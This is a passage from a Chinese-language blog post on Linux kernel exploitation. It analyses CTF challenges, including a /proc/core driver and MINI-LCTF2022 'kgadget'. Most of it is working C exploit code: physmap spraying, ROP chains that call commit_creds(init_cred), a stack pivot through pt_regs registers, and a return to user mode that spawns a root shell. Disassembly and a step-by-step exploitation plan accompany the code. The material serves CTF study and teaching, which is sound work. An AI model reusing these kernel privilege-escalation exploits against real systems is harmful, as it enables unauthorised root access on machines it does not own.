class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"><span class="type">size_t</span> retn = <span class="number">0xFFFFFFFF81003E15</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbp_ret = <span class="number">0xFFFFFFFF812D71EF</span>;</span><br><span class="line"><span class="type">size_t</span> leave_ret = <span class="number">0xFFFFFFFF81037384</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> try_hit = <span class="number">0xffff880000000000</span>+<span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            pop_rbp_ret += offset;</span><br><span class="line">            leave_ret += offset;</span><br><span class="line">            retn += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">physmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error: open core&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] page_size %llx&quot;</span>, &amp;page_size);</span><br><span class="line">    <span class="type">size_t</span> *rop = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>)) &#123;</span><br><span class="line">        rop[idx++] = add_rsp_0xe8_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0xb</span>); idx++) &#123;</span><br><span class="line">        rop[idx] = retn;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++] = pop_rdi_ret;</span><br><span class="line">    rop[idx++] = init_cred;</span><br><span class="line">    rop[idx++] = commit_creds;</span><br><span class="line">    rop[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> *page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    physmap();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0x40</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0x50</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rbp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, leave_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="RetSpill"><a href="#RetSpill" class="headerlink" title="RetSpill"></a>RetSpill</h2><h3 id="利用思路-6"><a href="#利用思路-6" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a>MINI-LCTF2022 - kgadget</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>启动脚本如下：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure></div>

<p>没有开kaslr所以有了函数地址。但是开启了smep和smap保护，所以就不能ret2usr了，注意kvm64默认开启kpti保护（当然-append也写了）所以最后返回用户态时要进行页表切换。</p>
<p>写了一个字符驱动程序，其他函数都没啥用，就不放出来了。就 kgadget-ioctl或者函数有用，该函数会直接调用我们传入的地址处的函数。</p>
<p><strong>kgadget_ioctl</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:00000000000000F3 ; __int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)</span><br><span class="line">.text.unlikely:00000000000000F3 kgadget_ioctl   proc near               ; DATA XREF: __mcount_loc:0000000000000653↓o</span><br><span class="line">.text.unlikely:00000000000000F3                                         ; .data:kgadget_fo↓o</span><br><span class="line">.text.unlikely:00000000000000F3</span><br><span class="line">.text.unlikely:00000000000000F3 regs_addr       = qword ptr -20h</span><br><span class="line">.text.unlikely:00000000000000F3</span><br><span class="line">.text.unlikely:00000000000000F3 __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:00000000000000F3 cmd = rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000000F3 param = rdx                             ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000000F3                 call    __fentry__      ; PIC mode</span><br><span class="line">.text.unlikely:00000000000000F8                 push    rbp</span><br><span class="line">.text.unlikely:00000000000000F9                 mov     rbp, rsp</span><br><span class="line">.text.unlikely:00000000000000FC                 push    rbx</span><br><span class="line">.text.unlikely:00000000000000FD                 sub     rsp, 10h</span><br><span class="line">.text.unlikely:0000000000000101                 mov     rax, gs:28h</span><br><span class="line">.text.unlikely:000000000000010A                 mov     [rbp-10h], rax</span><br><span class="line">.text.unlikely:000000000000010E                 xor     eax, eax</span><br><span class="line">.text.unlikely:0000000000000110                 cmp     esi, 1BF52h; if esi == 114514 jmp loc_1a3</span><br><span class="line">.text.unlikely:0000000000000116                 jnz     loc_1A3</span><br><span class="line">.text.unlikely:000000000000011C                 mov     rbx, [param]; arg3 -&gt; rbx</span><br><span class="line">.text.unlikely:000000000000011F kgadget_ptr = rbx                       ; void (*)(void)</span><br><span class="line">.text.unlikely:000000000000011F                 mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:0000000000000126                 mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:0000000000000129                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000012E                 mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:0000000000000135                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp</span><br><span class="line">.text.unlikely:000000000000013E                 mov     rax, [rbp-18h] ; rsp -&gt; rax</span><br><span class="line">.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:0000000000000149                 add     rax, 1000h</span><br><span class="line">.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h ; rax -&gt; kstack_end</span><br><span class="line">.text.unlikely:0000000000000155                 lea     rdx, [rax-0A8h]</span><br><span class="line">.text.unlikely:000000000000015C                 mov     [rbp-18h], rdx</span><br><span class="line">.text.unlikely:0000000000000160 regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:0000000000000160                 mov     regs, 3361626E74747261h</span><br><span class="line">.text.unlikely:000000000000016A                 mov     [rax-0A8h], rdx; 3361626E74747261h -&gt; pt_regs</span><br><span class="line">.text.unlikely:0000000000000171                 mov     [rax-0A0h], rdx</span><br><span class="line">.text.unlikely:0000000000000178                 mov     [rax-98h], rdx</span><br><span class="line">.text.unlikely:000000000000017F                 mov     [rax-90h], rdx</span><br><span class="line">.text.unlikely:0000000000000186                 mov     [rax-88h], rdx</span><br><span class="line">.text.unlikely:000000000000018D                 mov     [rax-80h], rdx</span><br><span class="line">.text.unlikely:0000000000000191                 mov     [rax-70h], rdx</span><br><span class="line">.text.unlikely:0000000000000195                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000019A                 call    __x86_indirect_thunk_rbx ;PIC mode ;call rbx</span><br><span class="line">.text.unlikely:000000000000019F                 xor     eax, eax</span><br><span class="line">.text.unlikely:00000000000001A1                 jmp     short loc_1B3</span><br><span class="line">.text.unlikely:00000000000001A3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text.unlikely:00000000000001A3</span><br><span class="line">.text.unlikely:00000000000001A3 loc_1A3:                                ; CODE XREF: kgadget_ioctl+23↑j</span><br><span class="line">.text.unlikely:00000000000001A3 __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:00000000000001A3 cmd = rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000001A3 param = rdx                             ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000001A3                 mov     __file, offset unk_420</span><br><span class="line">.text.unlikely:00000000000001AA                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:00000000000001AF                 or      rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text.unlikely:00000000000001B3</span><br><span class="line">.text.unlikely:00000000000001B3 loc_1B3:                                ; CODE XREF: kgadget_ioctl+AE↑j</span><br><span class="line">.text.unlikely:00000000000001B3                 mov     rcx, [rbp-10h]</span><br><span class="line">.text.unlikely:00000000000001B7                 xor     rcx, gs:28h</span><br><span class="line">.text.unlikely:00000000000001C0                 jz      short loc_1C7</span><br><span class="line">.text.unlikely:00000000000001C2                 call    __stack_chk_fail ; PIC mode</span><br><span class="line">.text.unlikely:00000000000001C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text.unlikely:00000000000001C7</span><br><span class="line">.text.unlikely:00000000000001C7 loc_1C7:                                ; CODE XREF: kgadget_ioctl+CD↑j</span><br><span class="line">.text.unlikely:00000000000001C7                 pop     rdx</span><br><span class="line">.text.unlikely:00000000000001C8                 pop     rcx</span><br><span class="line">.text.unlikely:00000000000001C9                 pop     rbx</span><br><span class="line">.text.unlikely:00000000000001CA                 pop     rbp</span><br><span class="line">.text.unlikely:00000000000001CB                 retn</span><br><span class="line">.text.unlikely:00000000000001CB kgadget_ioctl   endp</span><br></pre></td></tr></table></figure></div>

<p>不过根据输出他提示信息， pt_regs 中只有 r8 和 r9 寄存器可以使用，寄存器还有 r11 和 rcx 的值没有被覆盖，但调试时发现其也会被覆盖。</p>
<h3 id="利用思路-7"><a href="#利用思路-7" class="headerlink" title="利用思路"></a>利用思路</h3><p>这题主要思路如下：</p>
<ol>
<li><p>使用 mmap 喷射大量内存，并在里面写上rop链。</p>
</li>
<li><p>将try_hit的地址传给rdx寄存器，利用kgadget_ioctl去call rbx。</p>
</li>
<li><p>完成栈迁移，执行提权代码。</p>
</li>
</ol>
<p>返回用户空间在使用 <code>swapgs_restore_regs_and_return_to_usermode</code>  函数时应该注意，前面 pop 完寄存器之后除 iretq 需要的寄存器还剩 orig_rax 和 rdi ，为了缩短 rop 的长度，可以直接  retn 到 <code>swapgs_restore_regs_and_return_to_usermode + 27;</code>，不过 rop 接下来还要有 16 字节的填充来表示 orig_rax 和 rdi 的位置。</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error: open kgadget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> *rop = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>)) &#123;</span><br><span class="line">        rop[idx++] = <span class="number">0xffffffff810737fe</span>;<span class="comment">// add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">11</span>); idx++) &#123;</span><br><span class="line">        rop[idx] = <span class="number">0xffffffff8108c6f1</span>;<span class="comment">// ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff8108c6f0</span>;<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff82a6b700</span>;<span class="comment">// init_cred</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff810c92e0</span>;<span class="comment">// commit_creds</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;<span class="comment">// swapgs_restore_regs_and_return_to_usermode + 27;</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">        <span class="type">sigset_t</span> *page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0xffffffff811483d0;&quot;</span><span class="comment">// pop rsp; ret;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   dev_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>流程：</strong></p>
<p>在我们rop处下断点，发现执行到我们喷射的gadget处时，r8(pop rsp)距离rsp有0xa0大小，找到<code>add rsp,0xa0;;;;ret</code>样式的 gadget即可将栈迁移到我们用于提权的 gadget 处。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905101112480.png"
                      alt="image-20240905101112480"
                ></p>
<p>（1）利用kgadget_ioctl和pt_regs保留的r8-r9完成栈迁移。</p>
<p><img  
                     lazyload
